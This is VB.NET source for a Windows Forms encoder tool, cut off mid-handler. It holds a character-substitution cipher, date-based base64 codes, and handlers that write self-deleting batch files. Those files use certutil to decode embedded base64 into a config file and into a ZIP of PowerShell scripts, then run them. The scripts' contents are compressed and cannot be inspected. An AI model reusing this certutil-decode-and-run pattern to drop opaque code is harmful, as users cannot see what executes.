﻿Public Class Encodeur
    Private Sub Encodeur_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If (IO.File.Exists("Encodeur.exe.config")) Then GoTo EncodeurConfig
        GoTo MyEncodeurConfig
        GoTo EndSub
EncodeurConfig:
        GoTo EndSub
MyEncodeurConfig:
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("echo 77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiID8+DQo8Y29u>>EncodeurConfig.File")
        sb.AppendLine("echo ZmlndXJhdGlvbj4NCiAgICA8c3RhcnR1cD4NCiAgICAgICAgPHN1cHBvcnRlZFJ1>>EncodeurConfig.File")
        sb.AppendLine("echo bnRpbWUgdmVyc2lvbj0idjQuMCIgc2t1PSIuTkVURnJhbWV3b3JrLFZlcnNpb249>>EncodeurConfig.File")
        sb.AppendLine("echo djQuNy4xIiAvPg0KICAgIDwvc3RhcnR1cD4NCjwvY29uZmlndXJhdGlvbj4=>>EncodeurConfig.File")
        sb.AppendLine("certutil -decode EncodeurConfig.File Encodeur.exe.config")
        sb.AppendLine("if exist EncodeurConfig.File del /s /q EncodeurConfig.File")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("EncodeurConfig.bat", sb.ToString())
        Process.Start("EncodeurConfig.bat")
        Threading.Thread.Sleep(1000)
        System.IO.File.Delete("EncodeurConfig.bat")
        Application.Restart()
EndSub:
    End Sub
    Private Sub Label28_Click(sender As Object, e As EventArgs) Handles Label28.Click
        TextBox1.Text = TextBox1.Text.Replace("=", "¤")
        TextBox1.Text = TextBox1.Text.Replace("0", "°")
        TextBox1.Text = TextBox1.Text.Replace("9", "¿")
        TextBox1.Text = TextBox1.Text.Replace("8", "&")
        TextBox1.Text = TextBox1.Text.Replace("7", "ø")
        TextBox1.Text = TextBox1.Text.Replace("6", "º")
        TextBox1.Text = TextBox1.Text.Replace("5", "Ø")
        TextBox1.Text = TextBox1.Text.Replace("4", "%")
        TextBox1.Text = TextBox1.Text.Replace("3", "³")
        TextBox1.Text = TextBox1.Text.Replace("2", "²")
        TextBox1.Text = TextBox1.Text.Replace("1", "¹")
        TextBox1.Text = TextBox1.Text.Replace("a", "Ä")
        TextBox1.Text = TextBox1.Text.Replace("b", "ä")
        TextBox1.Text = TextBox1.Text.Replace("c", "¢")
        TextBox1.Text = TextBox1.Text.Replace("d", "â")
        TextBox1.Text = TextBox1.Text.Replace("e", "£")
        TextBox1.Text = TextBox1.Text.Replace("f", "ƒ")
        TextBox1.Text = TextBox1.Text.Replace("g", "Á")
        TextBox1.Text = TextBox1.Text.Replace("h", "á")
        TextBox1.Text = TextBox1.Text.Replace("i", "!")
        TextBox1.Text = TextBox1.Text.Replace("j", "í")
        TextBox1.Text = TextBox1.Text.Replace("k", "å")
        TextBox1.Text = TextBox1.Text.Replace("l", "¶")
        TextBox1.Text = TextBox1.Text.Replace("m", "ª")
        TextBox1.Text = TextBox1.Text.Replace("n", "ñ")
        TextBox1.Text = TextBox1.Text.Replace("o", "ò")
        TextBox1.Text = TextBox1.Text.Replace("p", "õ")
        TextBox1.Text = TextBox1.Text.Replace("q", "þ")
        TextBox1.Text = TextBox1.Text.Replace("r", "ó")
        TextBox1.Text = TextBox1.Text.Replace("s", "§")
        TextBox1.Text = TextBox1.Text.Replace("t", "ã")
        TextBox1.Text = TextBox1.Text.Replace("u", "µ")
        TextBox1.Text = TextBox1.Text.Replace("v", "Â")
        TextBox1.Text = TextBox1.Text.Replace("w", "Ã")
        TextBox1.Text = TextBox1.Text.Replace("x", "×")
        TextBox1.Text = TextBox1.Text.Replace("y", "¥")
        TextBox1.Text = TextBox1.Text.Replace("z", "ž")
        TextBox1.Text = TextBox1.Text.Replace("A", "$")
        TextBox1.Text = TextBox1.Text.Replace("B", "ß")
        TextBox1.Text = TextBox1.Text.Replace("C", "À")
        TextBox1.Text = TextBox1.Text.Replace("D", "à")
        TextBox1.Text = TextBox1.Text.Replace("E", "Œ")
        TextBox1.Text = TextBox1.Text.Replace("F", "ï")
        TextBox1.Text = TextBox1.Text.Replace("G", "Ï")
        TextBox1.Text = TextBox1.Text.Replace("H", "Î")
        TextBox1.Text = TextBox1.Text.Replace("I", "¦")
        TextBox1.Text = TextBox1.Text.Replace("J", "ì")
        TextBox1.Text = TextBox1.Text.Replace("K", "î")
        TextBox1.Text = TextBox1.Text.Replace("L", "#")
        TextBox1.Text = TextBox1.Text.Replace("M", "Ü")
        TextBox1.Text = TextBox1.Text.Replace("N", "Ñ")
        TextBox1.Text = TextBox1.Text.Replace("O", "ü")
        TextBox1.Text = TextBox1.Text.Replace("P", "û")
        TextBox1.Text = TextBox1.Text.Replace("Q", "Û")
        TextBox1.Text = TextBox1.Text.Replace("R", "Ú")
        TextBox1.Text = TextBox1.Text.Replace("S", "š")
        TextBox1.Text = TextBox1.Text.Replace("T", "Ù")
        TextBox1.Text = TextBox1.Text.Replace("U", "ú")
        TextBox1.Text = TextBox1.Text.Replace("V", "Ý")
        TextBox1.Text = TextBox1.Text.Replace("W", "ý")
        TextBox1.Text = TextBox1.Text.Replace("X", "Ÿ")
        TextBox1.Text = TextBox1.Text.Replace("Y", "ÿ")
        TextBox1.Text = TextBox1.Text.Replace("Z", "Ž")
    End Sub
    Private Sub Label29_Click(sender As Object, e As EventArgs) Handles Label29.Click
        TextBox1.Text = TextBox1.Text.Replace("¤", "=")
        TextBox1.Text = TextBox1.Text.Replace("°", "0")
        TextBox1.Text = TextBox1.Text.Replace("¿", "9")
        TextBox1.Text = TextBox1.Text.Replace("&", "8")
        TextBox1.Text = TextBox1.Text.Replace("ø", "7")
        TextBox1.Text = TextBox1.Text.Replace("º", "6")
        TextBox1.Text = TextBox1.Text.Replace("Ø", "5")
        TextBox1.Text = TextBox1.Text.Replace("%", "4")
        TextBox1.Text = TextBox1.Text.Replace("³", "3")
        TextBox1.Text = TextBox1.Text.Replace("²", "2")
        TextBox1.Text = TextBox1.Text.Replace("¹", "1")
        TextBox1.Text = TextBox1.Text.Replace("Ä", "a")
        TextBox1.Text = TextBox1.Text.Replace("ä", "b")
        TextBox1.Text = TextBox1.Text.Replace("¢", "c")
        TextBox1.Text = TextBox1.Text.Replace("â", "d")
        TextBox1.Text = TextBox1.Text.Replace("£", "e")
        TextBox1.Text = TextBox1.Text.Replace("ƒ", "f")
        TextBox1.Text = TextBox1.Text.Replace("Á", "g")
        TextBox1.Text = TextBox1.Text.Replace("á", "h")
        TextBox1.Text = TextBox1.Text.Replace("!", "i")
        TextBox1.Text = TextBox1.Text.Replace("í", "j")
        TextBox1.Text = TextBox1.Text.Replace("å", "k")
        TextBox1.Text = TextBox1.Text.Replace("¶", "l")
        TextBox1.Text = TextBox1.Text.Replace("ª", "m")
        TextBox1.Text = TextBox1.Text.Replace("ñ", "n")
        TextBox1.Text = TextBox1.Text.Replace("ò", "o")
        TextBox1.Text = TextBox1.Text.Replace("õ", "p")
        TextBox1.Text = TextBox1.Text.Replace("þ", "q")
        TextBox1.Text = TextBox1.Text.Replace("ó", "r")
        TextBox1.Text = TextBox1.Text.Replace("§", "s")
        TextBox1.Text = TextBox1.Text.Replace("ã", "t")
        TextBox1.Text = TextBox1.Text.Replace("µ", "u")
        TextBox1.Text = TextBox1.Text.Replace("Â", "v")
        TextBox1.Text = TextBox1.Text.Replace("Ã", "w")
        TextBox1.Text = TextBox1.Text.Replace("×", "x")
        TextBox1.Text = TextBox1.Text.Replace("¥", "y")
        TextBox1.Text = TextBox1.Text.Replace("ž", "z")
        TextBox1.Text = TextBox1.Text.Replace("$", "A")
        TextBox1.Text = TextBox1.Text.Replace("ß", "B")
        TextBox1.Text = TextBox1.Text.Replace("À", "C")
        TextBox1.Text = TextBox1.Text.Replace("à", "D")
        TextBox1.Text = TextBox1.Text.Replace("Œ", "E")
        TextBox1.Text = TextBox1.Text.Replace("ï", "F")
        TextBox1.Text = TextBox1.Text.Replace("Ï", "G")
        TextBox1.Text = TextBox1.Text.Replace("Î", "H")
        TextBox1.Text = TextBox1.Text.Replace("¦", "I")
        TextBox1.Text = TextBox1.Text.Replace("ì", "J")
        TextBox1.Text = TextBox1.Text.Replace("î", "K")
        TextBox1.Text = TextBox1.Text.Replace("#", "L")
        TextBox1.Text = TextBox1.Text.Replace("Ü", "M")
        TextBox1.Text = TextBox1.Text.Replace("Ñ", "N")
        TextBox1.Text = TextBox1.Text.Replace("ü", "O")
        TextBox1.Text = TextBox1.Text.Replace("û", "P")
        TextBox1.Text = TextBox1.Text.Replace("Û", "Q")
        TextBox1.Text = TextBox1.Text.Replace("Ú", "R")
        TextBox1.Text = TextBox1.Text.Replace("š", "S")
        TextBox1.Text = TextBox1.Text.Replace("Ù", "T")
        TextBox1.Text = TextBox1.Text.Replace("ú", "U")
        TextBox1.Text = TextBox1.Text.Replace("Ý", "V")
        TextBox1.Text = TextBox1.Text.Replace("ý", "W")
        TextBox1.Text = TextBox1.Text.Replace("Ÿ", "X")
        TextBox1.Text = TextBox1.Text.Replace("ÿ", "Y")
        TextBox1.Text = TextBox1.Text.Replace("Ž", "Z")
    End Sub
    Private Sub Label30_Click(sender As Object, e As EventArgs) Handles Label30.Click
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
    End Sub
    Private Sub Label31_Click(sender As Object, e As EventArgs) Handles Label31.Click
        TextBox1.Text = New System.Text.ASCIIEncoding().GetString(Convert.FromBase64String(TextBox1.Text))
    End Sub
    Private Sub Label32_Click(sender As Object, e As EventArgs) Handles Label32.Click
        If (IO.File.Exists("PS\")) Then GoTo Encodeur
        Call Encodeur()
        GoTo EndSub
Encodeur:
        GoTo EndSub
EndSub:
    End Sub
    Sub Encodeur()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("title Encodecode")
        sb.AppendLine("if exist PS\ goto End")
        sb.AppendLine("if exist Encodeur~.File del /s /q Encodeur~.File")
        sb.AppendLine("if exist Unzipped.ps1 del /s /q Unzipped.ps1")
        sb.AppendLine("if exist Unzip.file del /s /q Unzip.file")
        sb.AppendLine("if exist Unzipped.bat del /s /q Unzipped.bat")
        sb.AppendLine("if exist PS.ZIP del /s /q PS.zip")
        sb.AppendLine("echo UEsDBBQAAAAIADW7YUnlleivCgEAAAgDAAANAAAARGVjb2RlSGV4LnBzMZWQTW6D>>Encodeur~.File")
        sb.AppendLine("echo MBCF95Fyh1HEAiKZG2SBVEXdFCoRqWsCQ3E1/AjbJajJXXrU2oI2MYJGmYVle+Y9>>Encodeur~.File")
        sb.AppendLine("echo P39BlrFD3yCwQAgsj9SHSYkQ90Ji6Xe8yupO+HndlgLOECnJQkW0Xn0PBU7UYLXn>>Encodeur~.File")
        sb.AppendLine("echo hE88ofoddhBix6LjB6by1+VtdNkbF98WLDr5L4okF0jGaAeObBUuD+utxFbPbQIi>>Encodeur~.File")
        sb.AppendLine("echo yHVDgLv1t94Z9LpZr2CsqVAUdfeM1Nx/ItaTw9b1ZlFoSJikhevk+toIXxNZAK/m>>Encodeur~.File")
        sb.AppendLine("echo wqKhLLwhl6mvm4hx8okPIbUFN1+wGw9Qmgj/oTSZXKQ0OtuUjPiPkjnMUJqHlGIr>>Encodeur~.File")
        sb.AppendLine("echo leQELMO0zrDAE9jgl/yu2S9Xu8sPUEsDBBQAAAAIAEqnYkmHih1A7gAAANcBAAAM>>Encodeur~.File")
        sb.AppendLine("echo AAAARGlzbW91bnQucHMxdZHBioMwEIbvgu8wiActxDfoQShl97BaaGHPaR1rdidG>>Encodeur~.File")
        sb.AppendLine("echo nASR7b7LPurGtot0qXNIfpJ/vgx/8qoSh7FDEDkz6iONhdQI+5Et6mxQbWUGzmrT>>Encodeur~.File")
        sb.AppendLine("echo a4YLlM6KwhGFwc+tIC47bLeKcKMkmTOsocBBlMcPPNk/yvudsp0o2WPDIil7c2QV>>Encodeur~.File")
        sb.AppendLine("echo I02gNcS2dxgGcK//Zi8t9t4X5URQ+wuGZJWt0gv4NVpu5MYML0jd/MTSPHvvvMkk>>Encodeur~.File")
        sb.AppendLine("echo fRqFDwnlqUni2h9PjTtpG1Dts2FxSpnTea6vWW4Ua+NaK7z4fNXy7D/nul150QM+>>Encodeur~.File")
        sb.AppendLine("echo ArGTzIemdzPgOwx+AVBLAwQUAAAACAC5s1lJu9ZafwcBAAAFAwAACgAAAEVuY29k>>Encodeur~.File")
        sb.AppendLine("echo ZS5wczGVkMFqhDAQhu8L+w7D4kEXkjfYg1CWXqoFCz1ndawpoxETK9Ldd+mjNkHb>>Encodeur~.File")
        sb.AppendLine("echo XUVbdg4hycz/588XZhl76WsEFmqN5Yn6SJQISa8NlryTVaY6zXPVlBrOELeGRS3R>>Encodeur~.File")
        sb.AppendLine("echo dvM1FHhxjdVREj5IQeoNDhBhx+LTO6bmx+V1dDk6Fz4VrDrxp5aM1EjO6ACeaVpc>>Encodeur~.File")
        sb.AppendLine("echo H7Zbg42d24VEkNuGBn/P98EZ7LrbbmCsuVAXqntEqv9/IrGTw9YPFlFYSCjSwvdy>>Encodeur~.File")
        sb.AppendLine("echo e+2Ez8IUIKulsOgo68DlGurzJmIiPvAupFPBzRemjTsozYR/UJpNrlIanaeUnPiX>>Encodeur~.File")
        sb.AppendLine("echo kjssUFqGlGJjWiMJGFapyhCm1NfMrsEvV6/LN1BLAwQUAAAACABBu2FJ7tNuTAoB>>Encodeur~.File")
        sb.AppendLine("echo AAAIAwAADQAAAEVuY29kZUhleC5wczGVkE1ugzAQhfeRcodRxAIimRtkgVRF3RQq>>Encodeur~.File")
        sb.AppendLine("echo EalrAkNxNfwI2yWoyV161NqCNjGCRpmFZXvmPT9/QZaxQ98gsEAILI/Uh0mJEPdC>>Encodeur~.File")
        sb.AppendLine("echo Yul3vMrqTvh53ZYCzhApyUJFtF59DwVO1GC154RPPKH6HXYQYsei4wem8tflbXTZ>>Encodeur~.File")
        sb.AppendLine("echo GxffFiw6+S+KJBdIxmgHjmwVLg/rrcRWz20CIsh1Q4C79bfeGfS6Wa9grKlQFHX3>>Encodeur~.File")
        sb.AppendLine("echo jNTcfyLWk8PW9WZRaEiYpIXr5PraCF8TWQCv5sKioSy8IZepr5uIcfKJDyG1BTdf>>Encodeur~.File")
        sb.AppendLine("echo sBsPUJoI/6E0mVykNDrblIz4j5I5zFCah5RiK5XkBAyrtM6wwBPY4Jf8rtkvV7vL>>Encodeur~.File")
        sb.AppendLine("echo D1BLAwQUAAAACAAIqGJJLoAfV+sAAADQAQAACQAAAE1vdW50LnBzMXWRz4qDMBDG>>Encodeur~.File")
        sb.AppendLine("echo 74W+w1A8aCF5gx6EUnYP1UILPad1rOlOVJwEkXbfZR91Y/8gLuscko/JfL8ZJnGW>>Encodeur~.File")
        sb.AppendLine("echo iUNXI4iYGc2JukQZhH3HFo1sdZlVLcu8agzDHVJnReKI5jN4RZDWWG404Vorqi6w>>Encodeur~.File")
        sb.AppendLine("echo ggRbkZ6ueLZvyvFF2fQUOTbMZz/P+EuSW0dWM1IPWkFgG4eTbaWXFhtft4iJIPcP>>Encodeur~.File")
        sb.AppendLine("echo DOFSLqM7+HMxbeSiaj+Q6qHF1Dx7X/mUYTRaxdvgl4TqXIRB7tO9cadsAbr8b1js>>Encodeur~.File")
        sb.AppendLine("echo t8zRMNdtkNvKlVasNX99GnXxP/O4HrAxWuwU86Fo3OD9/gVQSwMEFAAAAAgA/LFZ>>Encodeur~.File")
        sb.AppendLine("echo SSbPzR8jAQAAKAMAAA4AAAAoQ29tcHJlc3MpLnBzMZWSQW6DMBBF95FyhxFiQSKZ>>Encodeur~.File")
        sb.AppendLine("echo G2SBGkXdFCpRqWsHhuLKYIRNEC29S49aOyEFUqwqXpgx/P89fjhIU/LSVQgkkBKL>>Encodeur~.File")
        sb.AppendLine("echo I+9CWiDEnVRY+C0rU9FKPxN1IaGHqFEkbDhfr74vA9yowvLAOO4Z5eINdhBiS6Lj>>Encodeur~.File")
        sb.AppendLine("echo OybqmvI6pBxMij83WJP8p4YrJpGboB24qm5wvYJh3Ip1qbDWOifgHDL9QYK39beb>>Encodeur~.File")
        sb.AppendLine("echo HvTs2I0yF+0j8mrcwtZPrJWX0tssotCQkCa552b6tTE+U5UDK5eaRUNZbsa+Pict>>Encodeur~.File")
        sb.AppendLine("echo xvSEdyGdG6xJE0ofrBop6cWZk372/+G7SfyLz6a04hv0Iz5j/EVnFgvolsk9iKKq>>Encodeur~.File")
        sb.AppendLine("echo UUoS1EnOTvpSn3Oc2R9xgOxRKlZSxUQ5CK57To76NSt/AFBLAwQUAAAACAB2sllJ>>Encodeur~.File")
        sb.AppendLine("echo EBGi+xYBAAANAwAACwAAACh1bnppcCkucHMxlZJBboMwEEX3kXKHEWIBkcwNskBK>>Encodeur~.File")
        sb.AppendLine("echo o24KlajUtQNDcWVshE0oanqXHrV2A01I8SJeWGP7/+/xk+OiIC9Dg0BipbA+8CGh>>Encodeur~.File")
        sb.AppendLine("echo NUI2KI111DNRyF5FpWxrBSdIO02SjvP16vs8wE8bFHvGcccol2+whQR7kh7eMddT>>Encodeur~.File")
        sb.AppendLine("echo yuuYsrcp0dzgTIqeOq6ZQm6DtuDrtsP1CsZxKzalxtbovJhzKM2BgmATbcITmNlz>>Encodeur~.File")
        sb.AppendLine("echo G1Ul+0fkzeUKVz+ZUZ7LIFxEYSAhzavAL822NT5TXQETS82ipazCqS+Az6sWM3rE>>Encodeur~.File")
        sb.AppendLine("echo u5DODc6kOyjdGP9TcimdlEb9hZI1/hGyiwVCy4AePhoqChK3ecWO5uf+pngz7B6Q>>Encodeur~.File")
        sb.AppendLine("echo HSrNBNVMilEw3Xj10K9Z+QNQSwMEFAAAAAgAGjhiSWWhtF/bAAAAugEAAAgAAABC>>Encodeur~.File")
        sb.AppendLine("echo dXJuLnBzMXVQQYqDQBC8C/6hEQ8qOHlBDkIIe1kNJJCzxjZOaB1jzyCS7F/2qTuS>>Encodeur~.File")
        sb.AppendLine("echo LG6W2IehmKmqrqmkLOPD2CHECTM2BY1p3iDsR9bYiEG2pRpYVKpvGO6QGR2nhsh1>>Encodeur~.File")
        sb.AppendLine("echo vh8DftZhu5WEG5mTOsMaUhzirLjgSf+6HJ8u28lFvAoWncSnIS0ZaTJag697g64D>>Encodeur~.File")
        sb.AppendLine("echo z/lPtlBjb3leQgSVfWAIIhGFd7CntyzkWg0fSN28YinP3jIfMAjfVmFLwvxUB35l>>Encodeur~.File")
        sb.AppendLine("echo ryfhLtc1yPZdWJxa5nDOdZuhZFWYvoXVFbwXrz/f+HKdH1BLAwQUAAAACADIs1lJ>>Encodeur~.File")
        sb.AppendLine("echo +af/CggBAAAFAwAACgAAAERlY29kZS5wczGVkE1qwzAQhfeB3GEIXtgB6wZZGEro>>Encodeur~.File")
        sb.AppendLine("echo pnbBha4Ve1yrjH+wpBrT5C49aiXsNpGxWzILIWnmPT19UZ6HL0OLEEZSYnWiIeYV>>Encodeur~.File")
        sb.AppendLine("echo QjpIhRXrRZ03vWRF01USzpBoFcaaaLv5Ggu8pMX6KAgfBKfmDQ4QYx8mp3fM1I/L>>Encodeur~.File")
        sb.AppendLine("echo 6+RytC7MFaw6sSdNSkgka3QAT3Ua14fNVmFn5nYRERSmIcHfs31wBrPuthuYai6U>>Encodeur~.File")
        sb.AppendLine("echo ZdM/IrX/P5GayXHrB4soDCTkWel7hbm2wmeuShD1Uli0lGVgc431eRMx5R94F1JX>>Encodeur~.File")
        sb.AppendLine("echo cPMFt3EHpZnwD0qzyVVKk7NLyYp/KdnDAqVlSBl2SitBEOaYNTmCS33N7Br8cvW6>>Encodeur~.File")
        sb.AppendLine("echo fANQSwECHwAUAAAACAA1u2FJ5ZXorwoBAAAIAwAADQAkAAAAAAAAACAAAAAAAAAA>>Encodeur~.File")
        sb.AppendLine("echo RGVjb2RlSGV4LnBzMQoAIAAAAAAAAQAYAAB/T8q4NNIBCrwUR+c00gEKvBRH5zTS>>Encodeur~.File")
        sb.AppendLine("echo AVBLAQIfABQAAAAIAEqnYkmHih1A7gAAANcBAAAMACQAAAAAAAAAIAAAADUBAABE>>Encodeur~.File")
        sb.AppendLine("echo aXNtb3VudC5wczEKACAAAAAAAAEAGADM8IlebTXSAbK6n8HoNNIBqbrar+g00gFQ>>Encodeur~.File")
        sb.AppendLine("echo SwECHwAUAAAACAC5s1lJu9ZafwcBAAAFAwAACgAkAAAAAAAAACAAAABNAgAARW5j>>Encodeur~.File")
        sb.AppendLine("echo b2RlLnBzMQoAIAAAAAAAAQAYAACjeNMwL9IBdB4XR+c00gF0HhdH5zTSAVBLAQIf>>Encodeur~.File")
        sb.AppendLine("echo ABQAAAAIAEG7YUnu025MCgEAAAgDAAANACQAAAAAAAAAIAAAAHwDAABFbmNvZGVI>>Encodeur~.File")
        sb.AppendLine("echo ZXgucHMxCgAgAAAAAAABABgAAEE71rg00gF0HhdH5zTSAXQeF0fnNNIBUEsBAh8A>>Encodeur~.File")
        sb.AppendLine("echo FAAAAAgACKhiSS6AH1frAAAA0AEAAAkAJAAAAAAAAAAgAAAAsQQAAE1vdW50LnBz>>Encodeur~.File")
        sb.AppendLine("echo MQoAIAAAAAAAAQAYANBsuqRtNdIBqbrar+g00gGputqv6DTSAVBLAQIfABQAAAAI>>Encodeur~.File")
        sb.AppendLine("echo APyxWUkmz80fIwEAACgDAAAOACQAAAAAAAAAIAAAAMMFAAAoQ29tcHJlc3MpLnBz>>Encodeur~.File")
        sb.AppendLine("echo MQoAIAAAAAAAAQAYAABWXuIuL9IB04AZR+c00gHTgBlH5zTSAVBLAQIfABQAAAAI>>Encodeur~.File")
        sb.AppendLine("echo AHayWUkQEaL7FgEAAA0DAAALACQAAAAAAAAAIAAAABIHAAAodW56aXApLnBzMQoA>>Encodeur~.File")
        sb.AppendLine("echo IAAAAAAAAQAYAABgRGovL9IBUeMbR+c00gFR4xtH5zTSAVBLAQIfABQAAAAIABo4>>Encodeur~.File")
        sb.AppendLine("echo YkllobRf2wAAALoBAAAIACQAAAAAAAAAIAAAAFEIAABCdXJuLnBzMQoAIAAAAAAA>>Encodeur~.File")
        sb.AppendLine("echo AQAYANnhC2H4NNIBj3xOhvc00gHDuEmG9zTSAVBLAQIfABQAAAAIAMizWUn5p/8K>>Encodeur~.File")
        sb.AppendLine("echo CAEAAAUDAAAKACQAAAAAAAAAIAAAAFIJAABEZWNvZGUucHMxCgAgAAAAAAABABgA>>Encodeur~.File")
        sb.AppendLine("echo AOz34jAv0gGhWRJH5zTSAaFZEkfnNNIBUEsFBgAAAAAJAAkARgMAAIIKAAAAAA==>>Encodeur~.File")
        sb.AppendLine("certutil -decode Encodeur~.File PS.zip")
        sb.AppendLine("timeout 1")
        sb.AppendLine("echo ZWNobyBFeHBhbmQtQXJjaGl2ZSAtUGF0aCAiUFMuemlwIiAtRGVzdGluYXRpb25Q>>Unzip.file")
        sb.AppendLine("echo YXRoICJQU1wiPj4iIlVuemlwcGVkLnBzMSAmJiBleGl0>>Unzip.file")
        sb.AppendLine("certutil -decode Unzip.file Unzipped.bat")
        sb.AppendLine("timeout 1")
        sb.AppendLine("start Unzipped.bat")
        sb.AppendLine("timeout 1")
        sb.AppendLine("PowerShell.exe -File Unzipped.ps1 -NoExit")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("if exist Encodeur~.File del /s /q Encodeur~.File")
        sb.AppendLine("if exist Unzipped.ps1 del /s /q Unzipped.ps1")
        sb.AppendLine("if exist Unzip.file del /s /q Unzip.file")
        sb.AppendLine("if exist Unzipped.bat del /s /q Unzipped.bat")
        sb.AppendLine("if exist PS.ZIP del /s /q PS.zip")
        sb.AppendLine("start %~dp0\PS\")
        sb.AppendLine("exit")
        IO.File.WriteAllText("Encodecode.bat", sb.ToString())
        Process.Start("Encodecode.bat")
        Threading.Thread.Sleep(5000)
        System.IO.File.Delete("Encodecode.bat")
    End Sub
    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(8)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("8 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(15)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("15 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(32)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("32 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(64)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("64 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(99)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("99 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(125)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("125 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label7_Click(sender As Object, e As EventArgs) Handles Label7.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(155)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("155 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label8_Click(sender As Object, e As EventArgs) Handles Label8.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(186)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("186 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label9_Click(sender As Object, e As EventArgs) Handles Label9.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(218)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("218 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label10_Click(sender As Object, e As EventArgs) Handles Label10.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(250)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("250 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label11_Click(sender As Object, e As EventArgs) Handles Label11.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(280)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("280 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label12_Click(sender As Object, e As EventArgs) Handles Label12.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(310)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("310 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label13_Click(sender As Object, e As EventArgs) Handles Label13.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(342)
        Console.WriteLine("Today: {0:dddd}", today)
